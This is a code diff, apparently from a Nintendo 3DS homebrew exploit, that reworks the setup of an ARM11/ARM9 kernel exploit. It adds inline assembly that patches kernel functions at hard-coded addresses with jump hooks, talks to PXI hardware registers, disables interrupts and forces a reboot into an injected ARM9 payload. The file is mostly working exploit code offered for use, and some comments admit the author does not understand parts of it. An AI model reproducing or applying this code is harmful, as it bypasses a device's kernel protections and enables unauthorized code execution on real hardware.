@@ -19,6 +19,24 @@ unsigned int *arm11_buffer;
 //Uncomment to have progress printed w/ printf
 #define DEBUG_PROCESS
 
+void invalidateInstructionCache(void){
+    __asm__(
+        "mcr p15,0,%0,c7,c5,0\t\n"
+        "mcr p15,0,%0,c7,c5,4\t\n"
+        "mcr p15,0,%0,c7,c5,6\t\n"
+        "mcr p15,0,%0,c7,c10,4\t\n"
+        :: "r" (0)
+    );
+}
+ 
+void invalidateDataCache(void) {
+    __asm__(
+        "mcr p15,0,%0,c7,c14,0\t\n"
+        "mcr p15,0,%0,c7,c10,4\t\n"
+        :: "r" (0)
+    );
+}
+
 int do_gshax_copy(void *dst, void *src, unsigned int len)
 {
 	unsigned int check_mem = linearMemAlign(0x10000, 0x40);
@@ -224,6 +242,9 @@ void test(void)
 // not called directly, offset determines jump
 void jump_table(void)
 {
+#ifdef DEBUG_PROCESS
+printf("Jumping\n");
+#endif
   func_patch_hook();
   reboot_func();
 }
@@ -241,20 +262,19 @@ arm9_kernel_exploit_setup(void)
 	printf("Setting up ARM9 Kernel Exploit\n");
 #endif
 
-	int FUNC_LEN;
+	int FUNC_LEN =0x1B60;
 	int ARM9_PAYLOAD_LEN;
 	int (*reboot)(int, int, int, int) = 0xFFF748C4;
 	 __asm__ volatile(
         "clrex"
     );
 
-	InvalidateEntireInstructionCache();
-	InvalidateEntireDataCache();
+	invalidateDataCache();
+	invalidateInstructionCache();
 
 
-	arm11_buffer[0] =0;
 	// ARM9 code copied to FCRAM 0x23F00000
-	memcpy(0xF3F00000, ARM9_PAYLOAD, ARM9_PAYLOAD_LEN);
+	//memcpy(0xF3F00000, ARM9_PAYLOAD, ARM9_PAYLOAD_LEN);
 	// write function hook at 0xFFFF0C80
 	memcpy(0xEFFF4C80, jump_table, FUNC_LEN);
 
@@ -263,17 +283,37 @@ arm9_kernel_exploit_setup(void)
 	*(int *)(0xEFFF4C80 + 0x64) = 0xFFFD2000; // PXI regs
 	*(int *)(0xEFFF4C80 + 0x68) = 0xFFF84DDC; // where to return to from hook
 
+	__asm__ ("LDR R0, [R0]\t\n"
+  		   "LDR R1, =0xE51FF004\t\n"
+           "STR R1, [R0]\t\n"
+           "LDR R1, =0x8F028C4\t\n"
+           "LDR R1, [R1]\t\n"
+           "STR R1, [R0,#4]");
+
 	// patch function 0xFFF84D90 to jump to our hook
 	*(int *)(0xFFF84DD4 + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
 	*(int *)(0xFFF84DD4 + 4) = 0xFFFF0C80; // jump_table + 0
 
-	// patch reboot start function to jump to our hook
-	*(int *)(0xFFFF097C + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
-	*(int *)(0xFFFF097C + 4) = 0x1FFF4C84; // jump_table + 4
-
-	InvalidateEntireDataCache();
 	
-	reboot(0, 0, 2, 0); // trigger reboot
+
+	__asm__ ("LDR R0, [R0]\t\n"
+  		   "LDR R1, =0xE51FF004\t\n"
+           "STR R1, [R0]\t\n"
+           "LDR R1, =0x8F028C4\t\n"
+           "LDR R1, [R1]\t\n"
+           "STR R1, [R0,#4]");
+
+	invalidateDataCache();
+
+	__asm__ ("MOV R0, #0\t\n"
+  		   "MOV R1, #0\t\n"
+           "MOV R2, #2\t\n"
+           "MOV R3, #0\t\n"
+           "LDR LR, =0x8F028BC\t\n"
+           "LDR LR, [LR]\t\n"
+           "BX LR");
+	
+	//reboot(0, 0, 2, 0); // trigger reboot
 }
 
 int __attribute__((naked))
@@ -287,34 +327,57 @@ arm11_kernel_stub (void)
 			 "ldr pc, [sp], #4\t\n");
 }
 
+void sub_20CC(void){
+	__asm__ ("LDR R1, =0xFFFCC48C\t\n"
+	  		  "1:\t\n"
+	           "LDRH R2, [R1,#4]\t\n"
+	           "TST R2, #2\t\n"
+	           "BNE 1b\t\n"
+	           "STR R0, [R1,#8]\t\n"
+	           "BX LR");
+}
+
+void sub_20E4(void){
+	__asm__ ("LDR R0, =0xFFFCC48C\t\n"
+	  		   "LDRB R1, [R0,#3]\t\n"
+	           "ORR R1, R1, #0x40\t\n"
+	           "STRB R1, [R0,#3]\t\n"
+	           "BX LR");
+}
+
+void sub_20F8(void){
+	__asm__ ("LDR R0, =0xFFFCC48C\t\n"
+	  		  "2:\t\n"
+	           "LDRH R1, [R0,#4]\t\n"
+	           "TST R1, #0x100\t\n"
+	           "BNE 2b\t\n"
+	           "LDR R0, [R0,#0xC]\t\n"
+	           "BX LR");
+}
 
 void func_patch_hook(void)
 {
+#ifdef DEBUG_PROCESS
+printf("Patching function\n");
+#endif
   // data written from entry
-  int pdn_regs;
-  int pxi_regs;
+ 	int pdn_regs;
+  	int pxi_regs;
 
-  int (*func_hook_return)(void);
+	int (*func_hook_return)(void);
 
   // save context
-  __asm__ ("stmfd sp!, {r0-r12,lr}");
+	__asm__ ("stmfd sp!, {r0-r12,lr}");
   // TODO: Why is this needed?
-  __asm__ ("ldr r0, =0x10008000\t\n"
-  		  "1:\t\n"
-           "ldrh r1, [r0,#4]\t\n"
-           "lsls r1, r1, #0x17\t\n"
-           "bmi 1b\t\n"
-           "ldr r0, [r0,#0xC]\t\n"
-           "mov pc, lr");
-  __asm__(".word 0x10008000\n");
-  __asm__ ("ldr r1, =0x10008000\t\n"
-  		  "2:\t\n"
-           "ldrh r2, [r1,#4]\t\n"
-           "lsls r2, r2, #0x1E\t\n"
-           "bmi 2b\t\n"
-           "str r0, [r1,#8]\t\n"
-           "mov pc, lr");
-  __asm__(".word 0x10008000\n");
+	__asm__ ("MOV R0, #0");
+  	sub_20CC();
+  	sub_20E4();
+  	__asm__ ("MOV R0, #0x10000");
+	sub_20CC();
+ 	sub_20F8();
+ 	sub_20F8();
+ 	sub_20F8();
+ 
   // TODO: What does this do?
   *(char *)(pdn_regs + 0x230) = 2;
   int i = 0;
@@ -329,10 +392,20 @@ void func_patch_hook(void)
 }
 
 // this is a patched version of function 0xFFFF097C
-// stuff found in the original code are skipped
 void reboot_func(void)
 {
-	 __asm__ (" SUB R3, R1, R0\t\n"
+#ifdef DEBUG_PROCESS
+printf("Rebooting\n");
+#endif
+	__asm__ ("ADR R0, 15f\t\n"
+          "ADR R1, 12f\t\n"
+          "LDR R2, =0x1FFFFC00\t\n"
+          "MOV R4, R2\t\n"
+          "BL 11f\t\n"
+          "BX R4");
+
+	 __asm__ ("11:\t\n"
+	 		"SUB R3, R1, R0\t\n"
 	 		"MOV R1, R3,ASR#2\t\n"
   			"CMP R1, #0\t\n"
           	"BLE 18f\t\n"
@@ -341,48 +414,57 @@ void reboot_func(void)
           	"SUB R1, R2, #4\t\n"
           	"BPL 8f\t\n"
           	"LDR R2, [R0,#4]!\t\n"
-          	"STR R2, [R1,#4]!");
-
-	 __asm__ ("8:\t\n"
+          	"STR R2, [R1,#4]!\t\n"
+	 		"8:\t\n"
   			"MOVS R2, R3,ASR#3\t\n"
-          	"BEQ 18f");
-
-	 __asm__ ("10:\t\n"
+          	"BEQ 18f\t\n"
+			"10:\t\n"
   			"LDR R3, [R0,#4]\t\n"
           	"SUBS R2, R2, #1\t\n"
           	"STR R3, [R1,#4]\t\n"
           	"LDR R3, [R0,#8]!\t\n"
           	"STR R3, [R1,#8]!\t\n"
-          	"BNE 10b");
-
-	 __asm__ ("18:\t\n"
+          	"BNE 10b\t\n"
+			"18:\t\n"
           	"BX LR");
 
 
-	 __asm__ ("MOV R0, #0x1FFFFFF8\t\n"
+// disable all interrupts
+	 __asm__ ("15:\t\n"
+	 		"MOV R0, #0x1FFFFFF8\t\n"
   			"MOV R1, #0\t\n"
           	"STR R1, [R0]\t\n"
           	"LDR R1, =0x10163008\t\n"
           	"LDR R2, =0x44846\t\n"
           	"STR R2, [R1]\t\n"
-          	"LDR R8, =0x10140000");
-  // disable all interrupts
-  __asm__ ("mrs r0, cpsr\t\n"
-           "orr r0, r0, #0x1C0\t\n"
-           "msr cpsr_cx, r0" ::: "r0");
-  while ( *(char *)0x10140000 & 1 ); // wait for powerup ready
-  *(void **)0x2400000C = 0x23F00000; // our ARM9 payload
-  __asm__ ("3:\t\n"
+          	"LDR R8, =0x10140000\t\n"
+          	"LDR R10, =0x2400000C\t\n"
+          	"LDR R9, =0x23F00000\t\n"
+          	"mrs r0, cpsr\t\n"
+            "orr r0, r0, #0x1C0\t\n"
+            "MSR CPSR_cx, R0");
+
+	__asm__ ("3:\t\n"
   			"LDRB R0, [R8]\t\n"
           	"ANDS R0, R0, #1\t\n"
           	"BNE 3b\t\n"
           	"STR R9, [R10]\t\n"
           	"MOV R0, #0x1FFFFFF8");
-  __asm__ ("4:\t\n"
+
+ 	__asm__ ("4:\t\n"
   			"LDR R1, [R0]\t\n"
           	"CMP R1, #0\t\n"
           	"BEQ 4b\t\n"
           	"BX R1");
+
+ 	__asm__ ("12:\t\n"
+ 			"MOV R0, #0\t\n"
+ 			"MCR p15, 0, R0,c8,c5, 0\t\n"
+          	"MCR p15, 0, R0,c8,c6, 0\t\n"
+          	"MCR p15, 0, R0,c8,c7, 0\t\n"
+          	"MCR p15, 0, R0,c7,c10, 4\t\n"
+          	"BX LR");
+
 }
 
 arm11_kernel_exec (void)
@@ -399,8 +481,8 @@ arm11_kernel_exec (void)
 		*(int *)(svc_patch_addr+8) = 0xE320F000; //NOP
 		patched_svc = 1;
 	}
-	InvalidateEntireInstructionCache();
-	InvalidateEntireDataCache();
+	invalidateDataCache();
+	invalidateInstructionCache();
 
 	return 0;
 }
